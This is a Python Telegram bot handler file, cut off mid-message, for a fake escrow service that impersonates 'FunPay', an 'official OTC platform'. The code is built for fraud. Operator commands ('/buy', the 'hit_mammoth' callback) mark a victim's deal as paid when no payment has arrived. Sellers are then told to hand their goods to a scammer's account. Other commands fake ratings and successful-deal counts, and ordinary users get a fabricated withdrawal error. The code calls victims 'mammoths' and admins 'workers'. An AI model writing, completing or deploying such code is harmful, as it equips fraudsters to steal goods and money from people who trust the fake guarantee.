import logging
import os
import sqlite3
import re
from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, FSInputFile
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext

from config import (
    ADMIN_IDS, SCAMMER_ID, SCAMMER_USERNAME,
    SUPPORT_USERNAME, COMMISSION, WELCOME_GIF_PATH,
    ERROR_MESSAGES,
    SCAMMER_STATS, SCAMMER_IDS,
    E_DEAL, E_GRAM, E_STARS, E_RUB, E_HAMMER, E_CHECK,
    E_CROSS, E_BACK, E_SHARE, E_CHART, E_LIST,
    E_USERS, E_SETTINGS, E_PAID, E_WARNING,
    E_PROFILE, E_WITHDRAW, E_CARD, E_GLOBE,
    E_CHAT, E_BANK, E_SUCCESS, E_GROUP,
    E_UP, E_DOWN, E_GIFT,
    E_RU, E_US, E_TR
)
from database import (
    init_db, add_user, get_user, add_requisite, get_requisites,
    delete_requisites, create_deal, get_deal, get_deal_by_partial,
    update_deal_buyer, update_deal_paid, update_deal_confirmed,
    update_deal_completed, get_user_deals, update_user_successful_deals,
    update_user_balance, get_all_users, get_all_deals,
    get_deal_count_by_status, get_user_count, DB_NAME
)
from keyboards import (
    main_menu, admin_panel, currency_selection, requisite_menu,
    deal_actions, deal_status_buttons, deal_paid_buttons,
    back_button, ok_button, share_deal, support_button, empty_keyboard
)
from states import DealStates, RequisiteStates

router = Router()
logger = logging.getLogger(__name__)

init_db()

def apply_scammer_stats():
    """Применяет рейтинг и сделки для всех скамеров из конфига"""
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    
    for user_id_str, stats in SCAMMER_STATS.items():
        try:
            user_id = int(user_id_str)
            deals = stats.get("deals", 0)
            rating = stats.get("rating", 0.0)
            
            cur.execute("SELECT user_id FROM users WHERE user_id = ?", (user_id,))
            if cur.fetchone():
                cur.execute(
                    "UPDATE users SET successful_deals = ?, rating = ? WHERE user_id = ?",
                    (deals, rating, user_id)
                )
            else:
                cur.execute(
                    "INSERT INTO users (user_id, username, full_name, successful_deals, rating) VALUES (?, ?, ?, ?, ?)",
                    (user_id, f"scammer_{user_id}", "Scammer", deals, rating)
                )
        except Exception as e:
            logger.error(f"Ошибка применения статистики для {user_id_str}: {e}")
    
    conn.commit()
    conn.close()
    logger.info("✅ Статистика скамеров применена")

apply_scammer_stats()

def is_admin(user_id):
    return user_id in ADMIN_IDS

def is_scammer(user_id):
    return user_id in SCAMMER_IDS

def validate_gram(address):
    return address.startswith('UQ') and len(address) >= 30

def validate_card(card):
    card = card.replace(' ', '').replace('-', '')
    return card.isdigit() and len(card) >= 16

def format_requisites(reqs):
    if not reqs:
        return "❌ Реквизиты не добавлены"
    lines = []
    for req_type, value in reqs:
        if req_type == "gram":
            lines.append(f"{E_GRAM} кошелёк:\n{value}")
        elif req_type == "card":
            lines.append(f"{E_CARD} карта:\n{value}")
        elif req_type == "stars":
            lines.append(f"{E_STARS} звёзды:\n{value}")
        elif req_type == "rub":
            lines.append(f"{E_RUB} рубли:\n{value}")
    return "\n\n".join(lines)

def format_amount(amount):
    if amount == int(amount):
        return str(int(amount))
    return str(amount)

def get_currency_emoji(currency):
    if currency == "грам":
        return E_GRAM
    elif currency == "карта":
        return "💳"
    elif currency == "звезд":
        return E_GIFT
    return ""

async def send_main_menu(message: Message, user_id: int):
    is_admin_user = is_admin(user_id)
    is_scammer_user = is_scammer(user_id)

    if is_admin_user:
        await message.answer(
            f"{E_SETTINGS} <b>Приветствую, воркер!</b>\n\n"
            f"<b>Наши команды:</b>\n"
            f"/buy *код-сделки* – для оплаты сделки\n"
            f"/set_sdel – для установки успешных сделок\n"
            f"/set_ret – для установки рейтинга (в профиле)\n"
            f"/twodeal *юз/айди* – сообщение о второй сделке\n"
            f"/send *текст* *юз/айди* – отправить сообщение\n"
            f"/chat *юз/айди* – выгрузить историю переписки"
        )

    if is_scammer_user and not is_admin_user:
        await message.answer(
            f"{E_SETTINGS} <b>Приветствую, скамер!</b>\n\n"
            f"<b>Доступные команды:</b>\n"
            f"/buy *код-сделки* – для оплаты сделки\n"
            f"/profile – просмотр профиля\n"
            f"/balance – баланс\n"
            f"/withdraw – вывод средств"
        )

    if os.path.exists(WELCOME_GIF_PATH):
        try:
            gif = FSInputFile(WELCOME_GIF_PATH)
            await message.answer_animation(
                animation=gif,
                caption=f"{E_BANK} <b>FunPay · Официальная OTC-платформа</b>\n\n"
                        f"{E_CHECK} <b>Мы предоставляем полностью автоматизированный сервис гаранта</b>\n"
                        f"для безопасного обмена цифровыми активами.\n\n"
                        f"{E_CHECK} <b>Почему выбирают нас?</b>\n"
                        f"• Средства блокируются в блокчейне — прозрачно и безопасно\n"
                        f"• Автоматическая проверка оплаты и передачи товара\n"
                        f"• Система рейтинга покупателей и продавцов\n"
                        f"• Поддержка 24/7\n\n"
                        f"{E_CHAT} <b>Поддержка:</b> {SUPPORT_USERNAME}",
                reply_markup=main_menu(is_admin_user)
            )
            return
        except Exception as e:
            logger.error(f"GIF error: {e}")

    text = f"{E_BANK} <b>FunPay · Официальная OTC-платформа</b>\n\n"
    text += f"{E_CHECK} <b>Мы предоставляем полностью автоматизированный сервис гаранта</b>\n"
    text += f"для безопасного обмена цифровыми активами.\n\n"
    text += f"{E_CHECK} <b>Почему выбирают нас?</b>\n"
    text += f"• Средства блокируются в блокчейне — прозрачно и безопасно\n"
    text += f"• Автоматическая проверка оплаты и передачи товара\n"
    text += f"• Система рейтинга покупателей и продавцов\n"
    text += f"• Поддержка 24/7\n\n"
    text += f"{E_CHAT} <b>Поддержка:</b> {SUPPORT_USERNAME}"

    await message.answer(text, reply_markup=main_menu(is_admin_user))

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()

    user_id = message.from_user.id
    username = message.from_user.username or "Нет юзернейма"
    full_name = message.from_user.full_name

    add_user(user_id, username, full_name)

    args = message.text.split()
    if len(args) > 1:
        param = args[1].strip()

        if not param.startswith("ref_"):
            deal_code = param
            deal = get_deal(deal_code)
            
            logger.info(f"START: deal_code={deal_code}, deal={deal}")

            if deal and deal[6] not in ['paid', 'confirmed', 'completed']:
                update_deal_buyer(deal_code, user_id)
                deal = get_deal(deal_code)
                
                currency_emoji = get_currency_emoji(deal[5])
                
                logger.info(f"START: currency={deal[5]}, is_stars={deal[5] == 'звезд'}")
                
                if deal[5] == "звезд":
                    await message.answer(
                        f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
                        f"<b>Сумма:</b> {format_amount(deal[4])} {currency_emoji}\n"
                        f"<b>Описание:</b> {deal[5]}\n"
                        f"<b>Комиссия:</b> {COMMISSION}%\n\n"
                        f"{E_CHAT} <b>Оплата через поддержку:</b>\n"
                        f"Нажмите кнопку «Саппорт» ниже — оператор подскажет, как оплатить звёздами.\n\n"
                        f"👉 {SCAMMER_USERNAME}\n\n"
                        f"<b>После успешной оплаты статус сделки изменится, и продавец получит уведомление о вашей успешной оплате!</b>",
                        reply_markup=support_button()
                    )
                else:
                    reqs = get_requisites(deal[1])
                    req_text = format_requisites(reqs)
                    await message.answer(
                        f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
                        f"<b>Сумма:</b> {format_amount(deal[4])} {currency_emoji}\n"
                        f"<b>Описание:</b> {deal[5]}\n"
                        f"<b>Комиссия:</b> {COMMISSION}%\n\n"
                        f"<b>Реквизиты для оплаты:</b>\n"
                        f"{req_text}\n\n"
                        f"<b>После успешной оплаты статус сделки изменится, и продавец получит уведомление о вашей успешной оплате!</b>",
                        reply_markup=support_button()
                    )

                buyer = get_user(user_id)
                buyer_deals = buyer[3] if buyer else 0
                buyer_rating = buyer[4] if buyer else 0.0

                await message.bot.send_message(
                    deal[1],
                    f"{E_WARNING} <b>@{username} ({user_id}) присоединился к сделке #{deal_code}!</b>\n"
                    f"{E_PROFILE} <b>Профиль покупателя:</b>\n"
                    f"⭐ <b>Рейтинг:</b> {buyer_rating}\n"
                    f"{E_SUCCESS} <b>Успешных сделок:</b> {buyer_deals}\n\n"
                    f"{E_WARNING} <b>Не передавайте товар на {SUPPORT_USERNAME}, пока бот не уведомит покупателя об оплате!</b>"
                )
                return

    await send_main_menu(message, user_id)

@router.message(Command("buy"))
async def cmd_buy(message: Message):
    if not is_admin(message.from_user.id) and not is_scammer(message.from_user.id):
        await message.answer(ERROR_MESSAGES["access_denied"])
        return

    args = message.text.split()
    if len(args) < 2:
        await message.answer(f"{E_CROSS} <b>Используйте: /buy #код-сделки</b>")
        return

    deal_code = args[1].replace('#', '').strip()
    deal_code = re.sub(r'[^a-zA-Z0-9]', '', deal_code)
    
    logger.info(f"BUY: cleaned code='{deal_code}', len={len(deal_code)}")
    
    deal = get_deal_by_partial(deal_code)
    
    logger.info(f"BUY: deal found={deal is not None}")

    if not deal:
        await message.answer(f"{E_CROSS} <b>Сделка не найдена. Проверьте код.</b>")
        return

    if deal[6] != 'joined':
        await message.answer(f"{E_CROSS} <b>Мамонт ещё не присоединился к сделке.</b>")
        return

    buyer_id = deal[3]
    buyer = get_user(buyer_id)
    buyer_username = buyer[1] if buyer else "Неизвестно"
    currency_emoji = get_currency_emoji(deal[5])

    await message.answer(
        f"{E_WARNING} <b>Вы уверены что хотите провести оплату по сделке #{deal[0]}?</b>\n\n"
        f"<b>Мамонт:</b> @{buyer_username} ({buyer_id})\n"
        f"<b>Сумма:</b> {format_amount(deal[4])} {currency_emoji}\n"
        f"<b>Описание:</b> {deal[5]}",
        reply_markup=deal_paid_buttons(deal[0])
    )

@router.message(Command("set_sdel"))
async def cmd_set_sdel(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer(ERROR_MESSAGES["access_denied"])
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer(f"{E_CROSS} <b>Используйте: /set_sdel &lt;количество&gt; [юз/айди]</b>")
        return
    
    try:
        count = int(args[1])
    except:
        await message.answer(f"{E_CROSS} <b>Количество должно быть числом</b>")
        return
    
    target = message.from_user.id
    target_username = "себе"
    
    if len(args) > 2:
        target_arg = args[2]
        if target_arg.startswith('@'):
            target_arg = target_arg.replace('@', '')
            conn = sqlite3.connect(DB_NAME)
            cur = conn.cursor()
            cur.execute("SELECT user_id FROM users WHERE username = ?", (target_arg,))
            result = cur.fetchone()
            conn.close()
            if result:
                target = result[0]
                target_username = f"@{target_arg}"
            else:
                await message.answer(f"{E_CROSS} <b>Пользователь @{target_arg} не найден</b>")
                return
        else:
            try:
                target = int(target_arg)
                target_username = str(target)
            except:
                await message.answer(f"{E_CROSS} <b>Неверный формат</b>")
                return
    
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute("UPDATE users SET successful_deals = ? WHERE user_id = ?", (count, target))
    conn.commit()
    conn.close()
    
    await message.answer(f"{E_SUCCESS} <b>Установлено {count} успешных сделок для {target_username}</b>")

@router.message(Command("set_ret"))
async def cmd_set_ret(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer(ERROR_MESSAGES["access_denied"])
        return
    
    args = message.text.split()
    if len(args) < 2:
        await message.answer(f"{E_CROSS} <b>Используйте: /set_ret &lt;рейтинг&gt; [юз/айди]</b>")
        return
    
    try:
        rating = float(args[1].replace(',', '.'))
        if rating < 0 or rating > 5:
            await message.answer(f"{E_CROSS} <b>Рейтинг должен быть от 0 до 5</b>")
            return
    except:
        await message.answer(f"{E_CROSS} <b>Рейтинг должен быть числом</b>")
        return
    
    target = message.from_user.id
    target_username = "себе"
    
    if len(args) > 2:
        target_arg = args[2]
        if target_arg.startswith('@'):
            target_arg = target_arg.replace('@', '')
            conn = sqlite3.connect(DB_NAME)
            cur = conn.cursor()
            cur.execute("SELECT user_id FROM users WHERE username = ?", (target_arg,))
            result = cur.fetchone()
            conn.close()
            if result:
                target = result[0]
                target_username = f"@{target_arg}"
            else:
                await message.answer(f"{E_CROSS} <b>Пользователь @{target_arg} не найден</b>")
                return
        else:
            try:
                target = int(target_arg)
                target_username = str(target)
            except:
                await message.answer(f"{E_CROSS} <b>Неверный формат</b>")
                return
    
    conn = sqlite3.connect(DB_NAME)
    cur = conn.cursor()
    cur.execute("UPDATE users SET rating = ? WHERE user_id = ?", (rating, target))
    conn.commit()
    conn.close()
    
    await message.answer(f"{E_SUCCESS} <b>Установлен рейтинг {rating} для {target_username}</b>")

@router.message(Command("twodeal"))
async def cmd_twodeal(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer(ERROR_MESSAGES["access_denied"])
        return
    await message.answer(f"{E_SUCCESS} <b>Функция в разработке</b>")

@router.message(Command("send"))
async def cmd_send(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer(ERROR_MESSAGES["access_denied"])
        return
    await message.answer(f"{E_SUCCESS} <b>Функция в разработке</b>")

@router.message(Command("chat"))
async def cmd_chat(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer(ERROR_MESSAGES["access_denied"])
        return
    await message.answer(f"{E_SUCCESS} <b>Функция в разработке</b>")

@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await send_main_menu(callback.message, callback.from_user.id)
    await callback.message.delete()
    await callback.answer()

@router.callback_query(F.data == "admin_panel")
async def admin_panel_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    if not callback.message.text:
        await callback.message.answer(
            f"{E_SETTINGS} <b>Админ-панель</b>\n\n<b>Выберите действие:</b>",
            reply_markup=admin_panel()
        )
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(
        f"{E_SETTINGS} <b>Админ-панель</b>\n\n<b>Выберите действие:</b>",
        reply_markup=admin_panel()
    )
    await callback.answer()

@router.callback_query(F.data == "admin_stats")
async def admin_stats(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    user_count = get_user_count()
    deals = get_all_deals()
    stats = get_deal_count_by_status()

    text = f"{E_CHART} <b>Статистика</b>\n\n"
    text += f"{E_USERS} <b>Всего пользователей:</b> {user_count}\n"
    text += f"{E_LIST} <b>Всего сделок:</b> {len(deals)}\n\n"
    text += f"<b>Статусы:</b>\n"
    for status, count in stats:
        emoji = {'created': '🟡', 'joined': '🔵', 'paid': '🟣', 'confirmed': '🟠', 'completed': E_SUCCESS}.get(status, '⚪')
        text += f"{emoji} {status}: {count}\n"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=back_button())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "admin_deals")
async def admin_deals(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    deals = get_all_deals()[:10]

    if not deals:
        text = f"{E_LIST} <b>Нет сделок</b>"
    else:
        text = f"{E_LIST} <b>Последние 10 сделок:</b>\n\n"
        for deal in deals:
            currency_emoji = get_currency_emoji(deal[5])
            text += f"#{deal[0]} | {format_amount(deal[4])} {currency_emoji} | {deal[6]}\n"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=back_button())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "admin_users")
async def admin_users(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    users = get_all_users()[:10]

    if not users:
        text = f"{E_USERS} <b>Нет пользователей</b>"
    else:
        text = f"{E_USERS} <b>Последние 10 пользователей:</b>\n\n"
        for user in users:
            text += f"@{user[1]} | <b>Сделок:</b> {user[3]} | <b>Рейтинг:</b> {user[4]}\n"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=back_button())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "create_deal")
async def create_deal_start(callback: CallbackQuery, state: FSMContext):
    if not callback.message.text:
        await callback.message.answer(
            f"{E_DEAL} <b>Выберите валюту сделки:</b>",
            reply_markup=currency_selection()
        )
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(
        f"{E_DEAL} <b>Выберите валюту сделки:</b>",
        reply_markup=currency_selection()
    )
    await state.set_state(DealStates.waiting_currency)
    await callback.answer()

@router.callback_query(F.data.startswith("currency_"))
async def select_currency(callback: CallbackQuery, state: FSMContext):
    currency = callback.data.replace("currency_", "")
    currency_names = {
        "gram": "грам",
        "card": "карта",
        "stars": "звезд"
    }
    
    currency_display = {"gram": "GRAM", "card": "Карта", "stars": "Звёзды"}[currency]
    
    if currency == "stars":
        await state.update_data(currency=currency_names[currency])
        if not callback.message.text:
            await callback.message.answer(
                f"{E_WARNING} <b>Введите сумму сделки:</b>",
                reply_markup=back_button()
            )
            await callback.message.delete()
            await callback.answer()
            return
        await callback.message.edit_text(
            f"{E_WARNING} <b>Введите сумму сделки:</b>",
            reply_markup=back_button()
        )
        await state.set_state(DealStates.waiting_amount)
        await callback.answer()
        return
    
    user_id = callback.from_user.id
    reqs = get_requisites(user_id)
    
    has_req = False
    req_type = "gram" if currency == "gram" else "card"
    for req in reqs:
        if req[0] == req_type:
            has_req = True
            break
    
    if not has_req:
        if not callback.message.text:
            await callback.message.answer(
                f"{E_CROSS} <b>У вас не добавлены реквизиты для {currency_display}!</b>\n\n"
                f"<b>Добавьте их в меню 'Реквизиты'</b>",
                reply_markup=requisite_menu()
            )
            await callback.message.delete()
            await callback.answer()
            return
        await callback.message.edit_text(
            f"{E_CROSS} <b>У вас не добавлены реквизиты для {currency_display}!</b>\n\n"
            f"<b>Добавьте их в меню 'Реквизиты'</b>",
            reply_markup=requisite_menu()
        )
        await callback.answer()
        return
    
    await state.update_data(currency=currency_names[currency])
    if not callback.message.text:
        await callback.message.answer(
            f"{E_WARNING} <b>Введите сумму сделки:</b>",
            reply_markup=back_button()
        )
        await callback.message.delete()
        await callback.answer()
        return
    await callback.message.edit_text(
        f"{E_WARNING} <b>Введите сумму сделки:</b>",
        reply_markup=back_button()
    )
    await state.set_state(DealStates.waiting_amount)
    await callback.answer()

@router.message(DealStates.waiting_amount)
async def process_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text.replace(',', '.'))
        if amount <= 0:
            raise ValueError
    except:
        await message.answer(ERROR_MESSAGES["invalid_amount"])
        return

    await state.update_data(amount=amount)
    data = await state.get_data()
    currency = data.get('currency', 'грам')
    currency_emoji = get_currency_emoji(currency)

    await message.answer(
        f"{E_DEAL} <b>Что вы предлагаете за {format_amount(amount)} {currency_emoji}?</b>",
        reply_markup=back_button()
    )
    await state.set_state(DealStates.waiting_description)

@router.message(DealStates.waiting_description)
async def process_description(message: Message, state: FSMContext):
    description = message.text
    if len(description) > 200:
        await message.answer(ERROR_MESSAGES["description_too_long"])
        return

    data = await state.get_data()
    currency = data.get('currency', 'грам')
    amount = data.get('amount', 0)

    user_id = message.from_user.id
    
    if currency == "грам" or currency == "карта":
        reqs = get_requisites(user_id)
        req_type = "gram" if currency == "грам" else "card"
        has_req = False
        for req in reqs:
            if req[0] == req_type:
                has_req = True
                break
        if not has_req:
            await message.answer(
                f"{E_CROSS} <b>У вас не добавлены реквизиты для {currency}!</b>\n\n"
                f"<b>Добавьте их в меню 'Реквизиты'</b>",
                reply_markup=requisite_menu()
            )
            return

    bot_username = (await message.bot.get_me()).username

    deal_code = create_deal(user_id, currency, amount, description)
    deal_link = f"https://t.me/{bot_username}?start={deal_code}"

    await state.clear()
    currency_emoji = get_currency_emoji(currency)

    await message.answer(
        f"{E_SUCCESS} <b>Сделка создана!</b>\n\n"
        f"<b>Номер сделки:</b> #{deal_code}\n"
        f"<b>Сумма:</b> {format_amount(amount)} {currency_emoji}\n"
        f"<b>Описание:</b> {description}\n\n"
        f"<b>Ссылка для покупателя:</b>\n{deal_link}\n\n"
        f"<b>Отправьте эту ссылку покупателю для совершения оплаты!</b>",
        reply_markup=deal_actions(deal_code)
    )

@router.callback_query(F.data.startswith("share_"))
async def share_deal_link(callback: CallbackQuery):
    deal_code = callback.data.replace("share_", "")
    
    if deal_code.startswith("send_"):
        deal_code = deal_code.replace("send_", "")
        deal = get_deal(deal_code)
        if not deal:
            await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
            return
        bot_username = (await callback.bot.get_me()).username
        deal_link = f"https://t.me/{bot_username}?start={deal_code}"
        
        await callback.message.answer(
            f"{deal_link}\n\n<b>По этой ссылке можно перейти на сделку со мной 🤝</b>"
        )
        await callback.answer("✅ Ссылка отправлена!")
        return

    deal = get_deal(deal_code)
    if not deal:
        await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
        return

    bot_username = (await callback.bot.get_me()).username
    deal_link = f"https://t.me/{bot_username}?start={deal_code}"

    await callback.message.answer(
        f"{E_SHARE} <b>Ссылка для покупателя:</b>\n{deal_link}",
        reply_markup=share_deal(deal_code, deal_link)
    )
    await callback.answer()

@router.callback_query(F.data.startswith("cancel_deal_"))
async def cancel_deal(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer(
        f"{E_CROSS} <b>Сделка отменена</b>",
        reply_markup=back_button()
    )
    await callback.answer()

@router.callback_query(F.data == "requisites")
async def requisites_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    reqs = get_requisites(user_id)

    text = f"{E_CARD} <b>Ваши реквизиты:</b>\n\n"
    if reqs:
        for i, (req_type, value) in enumerate(reqs, 1):
            text += f"{i}. {req_type.upper()}: {value}\n"
    else:
        text += f"{E_CROSS} <b>Реквизиты не добавлены</b>\n\n"

    text += f"\n{E_DEAL} <b>Выберите действие:</b>"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=requisite_menu())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=requisite_menu())
    await callback.answer()

@router.callback_query(F.data == "add_gram")
async def add_gram_start(callback: CallbackQuery, state: FSMContext):
    if not callback.message.text:
        await callback.message.answer(
            f"{E_WARNING} <b>Укажите адрес кошелька GRAM:</b>",
            reply_markup=back_button()
        )
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(
        f"{E_WARNING} <b>Укажите адрес кошелька GRAM:</b>",
        reply_markup=back_button()
    )
    await state.set_state(RequisiteStates.waiting_gram)
    await callback.answer()

@router.message(RequisiteStates.waiting_gram)
async def process_gram(message: Message, state: FSMContext):
    address = message.text.strip()

    if not validate_gram(address):
        await message.answer(
            ERROR_MESSAGES["invalid_gram"],
            reply_markup=back_button()
        )
        return

    user_id = message.from_user.id
    add_requisite(user_id, "gram", address)

    await state.clear()
    await message.answer(
        f"{E_SUCCESS} <b>Кошелёк GRAM успешно добавлен!</b>",
        reply_markup=back_button()
    )

@router.callback_query(F.data == "add_card")
async def add_card_start(callback: CallbackQuery, state: FSMContext):
    if not callback.message.text:
        await callback.message.answer(
            f"{E_WARNING} <b>Укажите номер карты:</b>",
            reply_markup=back_button()
        )
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(
        f"{E_WARNING} <b>Укажите номер карты:</b>",
        reply_markup=back_button()
    )
    await state.set_state(RequisiteStates.waiting_card)
    await callback.answer()

@router.message(RequisiteStates.waiting_card)
async def process_card(message: Message, state: FSMContext):
    card_data = message.text.strip()
    card_number = ''.join(filter(str.isdigit, card_data))

    if not validate_card(card_number):
        await message.answer(
            ERROR_MESSAGES["invalid_card"],
            reply_markup=back_button()
        )
        return

    user_id = message.from_user.id
    add_requisite(user_id, "card", card_data)

    await state.clear()
    await message.answer(
        f"{E_SUCCESS} <b>Карта успешно добавлена!</b>",
        reply_markup=back_button()
    )

@router.callback_query(F.data == "delete_requisites")
async def delete_requisites_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    delete_requisites(user_id)

    if not callback.message.text:
        await callback.message.answer(
            f"{E_SUCCESS} <b>Все реквизиты удалены!</b>",
            reply_markup=back_button()
        )
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(
        f"{E_SUCCESS} <b>Все реквизиты удалены!</b>",
        reply_markup=back_button()
    )
    await callback.answer()

@router.callback_query(F.data == "profile")
async def profile_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    user = get_user(user_id)

    if not user:
        await callback.answer(f"{E_CROSS} <b>Пользователь не найден</b>", show_alert=True)
        return

    deals = get_user_deals(user_id)
    completed = [d for d in deals if d[6] == 'completed']

    text = f"{E_PROFILE} <b>Профиль</b>\n\n"
    text += f"🆔 <b>ID:</b> {user[0]}\n"
    text += f"{E_PROFILE} <b>Юзернейм:</b> @{user[1]}\n"
    text += f"📝 <b>Имя:</b> {user[2]}\n"
    text += f"{E_SUCCESS} <b>Успешных сделок:</b> {user[3]}\n"
    text += f"⭐ <b>Рейтинг:</b> {user[4]}\n"
    text += f"💰 <b>Баланс:</b> {user[5]} RUB\n"
    text += f"{E_LIST} <b>Всего сделок:</b> {len(deals)}\n"
    text += f"{E_SUCCESS} <b>Завершено:</b> {len(completed)}"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=back_button())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "withdraw")
async def withdraw_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    user = get_user(user_id)
    balance = user[5] if user else 0

    if not is_admin(user_id) and not is_scammer(user_id):
        await callback.message.edit_text(
            f"{E_CROSS} <b>Ошибка вывода!</b>\n\n"
            f"<b>Минимальная сумма для вывода:</b> 1000 RUB\n"
            f"<b>Ваш баланс:</b> {balance} RUB\n\n"
            f"<b>Для решения проблемы обратитесь в поддержку:</b> {SUPPORT_USERNAME}",
            reply_markup=support_button()
        )
        await callback.answer()
        return

    reqs = get_requisites(user_id)
    if not reqs:
        await callback.message.edit_text(
            f"{E_CROSS} <b>У вас нет реквизитов для вывода!</b>\n\n<b>Добавьте реквизиты в меню 'Реквизиты'</b>",
            reply_markup=back_button()
        )
        await callback.answer()
        return

    text = f"{E_WITHDRAW} <b>Вывод средств</b>\n\n"
    text += f"<b>Ваш баланс:</b> {balance} RUB\n"
    text += "<b>Ваши реквизиты для вывода:</b>\n"
    for req_type, value in reqs:
        text += f"• {req_type.upper()}: {value}\n"
    text += f"\n{E_CHAT} <b>Заявка на вывод отправлена! Ожидайте обработки.</b>"

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "referrals")
async def referrals_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    bot_username = (await callback.bot.get_me()).username

    text = f"{E_GROUP} <b>Реферальная система</b>\n\n"
    text += "<b>Приглашайте друзей и получайте бонусы!</b>\n"
    text += f"<b>Ваша реферальная ссылка:</b>\n"
    text += f"https://t.me/{bot_username}?start=ref_{user_id}\n\n"
    text += "<b>За каждого приглашённого друга вы получаете 5% от его сделок!</b>"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=back_button())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "language")
async def language_callback(callback: CallbackQuery):
    text = f"{E_GLOBE} <b>Выберите язык:</b>\n\n"
    text += f"{E_RU} <b>Русский</b>\n"
    text += f"{E_US} <b>English</b>\n"
    text += f"{E_TR} <b>Türkçe</b>"

    if not callback.message.text:
        await callback.message.answer(text, reply_markup=back_button())
        await callback.message.delete()
        await callback.answer()
        return

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data.startswith("hit_mammoth_"))
async def hit_mammoth(callback: CallbackQuery, state: FSMContext):
    # ===== ПРОВЕРКА: АДМИН ИЛИ СКАМЕР =====
    if not is_admin(callback.from_user.id) and not is_scammer(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    await state.clear()

    deal_code = callback.data.replace("hit_mammoth_", "")
    deal = get_deal(deal_code)

    if not deal:
        await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
        return

    if deal[6] in ['paid', 'confirmed', 'completed']:
        await callback.answer("❌ Сделка уже в обработке!", show_alert=True)
        return

    update_deal_paid(deal_code)
    deal = get_deal(deal_code)
    
    seller_id = deal[1]
    currency_emoji = get_currency_emoji(deal[5])
    amount_display = format_amount(deal[4])

    await callback.message.edit_text(
        f"{E_SUCCESS} <b>Оплата по сделке #{deal_code} успешно получена!</b>\n<b>Продавец получил уведомление</b>",
        reply_markup=None
    )

    await callback.message.answer(
        f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
        f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
        f"<b>Описание:</b> {deal[5]}\n"
        f"<b>Комиссия:</b> {COMMISSION}%\n\n"
        f"{E_WARNING} <b>Статус сделки: покупатель успешно оплатил</b>\n\n"
        f"{E_WARNING} <b>Дождитесь, пока продавец передаст товар на аккаунт {SUPPORT_USERNAME}, а затем подтвердите это в боте!</b>"
    )

    if seller_id:
        try:
            await callback.bot.send_message(
                seller_id,
                f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
                f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
                f"<b>Описание:</b> {deal[5]}\n"
                f"<b>Комиссия:</b> {COMMISSION}%\n\n"
                f"{E_PAID} <b>Статус сделки: покупатель успешно оплатил</b>\n"
                f"{E_DOWN} <b>ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО</b> {E_DOWN}\n"
                f"{E_WARNING} {SCAMMER_USERNAME}\n"
                f"{E_UP} <b>ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО</b> {E_UP}\n\n"
